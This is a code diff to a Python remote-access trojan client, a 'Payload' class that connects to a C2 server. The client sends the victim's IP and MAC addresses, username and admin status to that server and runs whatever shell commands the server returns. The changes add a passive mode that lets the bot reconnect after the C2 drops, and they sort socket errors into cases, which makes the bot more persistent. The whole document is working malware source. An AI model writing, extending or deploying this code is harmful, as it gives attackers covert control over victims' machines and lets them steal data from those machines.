@@ -7,6 +7,7 @@ import os
 import sys
 import time
 import json
+import errno
 import base64
 import ctypes
 import ftplib
@@ -120,6 +121,7 @@ class Payload():
                 log("{} error: {}".format(self._get_connection.__name__, str(e)))
                 sys.exit()
         self.flags.connection.set()
+        self.flags.passive.clear()
         return connection
 
     def _get_key(self, connection):
@@ -136,8 +138,8 @@ class Payload():
         for function in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
             try:
                 info[function] = globals()[function]()
-                if type(info[function]) == bytes:
-                    info[function] = "_b64__" + base64.encodebytes(info[function]).decode('ascii')
+                if isinstance(info[function], bytes):
+                    info[function] = "_b64__" + base64.b64encode(info[function]).decode('ascii')
             except Exception as e:
                 log("{} returned error: {}".format(function, str(e)))
         data = globals()['encrypt_aes'](json.dumps(info), self.key)
@@ -371,6 +373,7 @@ class Payload():
         """
         try:
             self.flags.connection.clear()
+            self.flags.passive.clear()
             self.flags.prompt.clear()
             self.connection.close()
             for thread in list(self.handlers):
@@ -688,8 +691,9 @@ class Payload():
         Keep client alive while waiting to re-connect
 
         """
-        self.flags['connection'].clear()
-        self._get_connection(self.c2[0], self.c2[1])
+        log("{} : Bot entering passive mode awaiting C2.".format(self.passive.__name__))
+        self.flags.connection.clear()
+        self.flags.passive.set()
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='restart [output]')
     def restart(self, output='connection'):
@@ -1059,7 +1063,19 @@ class Payload():
                 return True
             return False
         except Exception as e:
-            log("{} error: {}".format(self.send_task.__name__, str(e)))
+            e = str(e)
+            if "Errno 104" in e or "10054" in e:
+                log("{} socket error: SERVER DISCONNECTED GRACEFULLY - {}".format(self.send_task.__name__, e))
+                self.kill()
+                return
+            elif "Errno 32" in e or "10052" in e:
+                log("{} socket error: SERVER CRASHED OR INTERRUPTED - {}".format(self.send_task.__name__, e))
+            elif "Errno 111" in e or "10061" in e:
+                log("{} socket error: SERVER OFFLINE OR CHANGED PORT - {}".format(self.send_task.__name__, e))
+            else:
+                log("{} socket error: SERVER UNKNOWN COMMUNICATION FAILURE - {}".format(self.send_task.__name__, e))
+            self.passive()
+            #log("{} error: {}".format(self.send_task.__name__, str(e)))
 
     def recv_task(self):
         """
@@ -1084,8 +1100,22 @@ class Payload():
                 return json.loads(data)
             else:
                 log("{} error: invalid header length".format(self.recv_task.__name__))
+                if not self.connection.recv(hdr_len):
+                    self.kill()
         except Exception as e:
-            log("{} error: {}".format(self.recv_task.__name__, str(e)))
+            e = str(e)
+            if "Errno 104" in e or "10054" in e:
+                log("{} socket error: SERVER DISCONNECTED GRACEFULLY - {}".format(self.recv_task.__name__, e))
+                self.kill()
+                return
+            elif "Errno 32" in e or "10052" in e:
+                log("{} socket error: SERVER CRASHED OR INTERRUPTED - {}".format(self.recv_task.__name__, e))
+            elif "Errno 111" in e or "10061" in e:
+                log("{} socket error: SERVER OFFLINE OR CHANGED PORT - {}".format(self.recv_task.__name__, e))
+            else:
+                log("{} socket error: SERVER UNKNOWN COMMUNICATION FAILURE - {}".format(self.recv_task.__name__, e))    
+            self.passive()
+            #log("{} error: {}".format(self.recv_task.__name__, str(e)))
 
     def run(self):
         """
@@ -1099,26 +1129,35 @@ class Payload():
         self.handlers['thread_handler'] = self._get_thread_handler()
         log(json.dumps(self.remote, indent=2))
         while True:
-            if self.flags.connection.wait(timeout=1.0):
+            if self.flags.passive.is_set() and not self.flags.connection.is_set():
+                host, port = self.c2
+                self.connection = self._get_connection(host, port)
+                self.key = self._get_key(self.connection)
+                self.info = self._get_info()
+                log("{} : leaving passive mode.".format(self.run.__name__))
+            elif self.flags.connection.wait(timeout=1.0):
                 if not self.flags.prompt.is_set():
                     task = self.recv_task()
                     if isinstance(task, dict) and 'task' in task:
-                        cmd, _, action = task['task'].encode().partition(' ')
+                        cmd, _, action = task['task'].partition(' ')
                         try:
                             command = self._get_command(cmd)
                             if command:
-                                result = bytes(command(action) if action else command())
+                                result = command(action) if action else command()
                             else:
                                 result, reserr = subprocess.Popen(task['task'].encode(), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()
                                 if result == None:
                                     result = reserr
+                            if result != None:
                                 result = bytes().join(result)
                         except Exception as e:
-                            result = "{} error: {}".format(self.run.__name__, str(e))
+                            result = "{} error: {}".format(self.run.__name__, str(e)).encode()
                             log(result)
                         task.update({'result': result})
                         self.send_task(task)
                     self.flags.prompt.set()
+                elif self.flags.prompt.set() and not self.flags.connection.wait(timeout=1.0):
+                    self.kill()
             else:
                 log("Connection timed out")
                 break
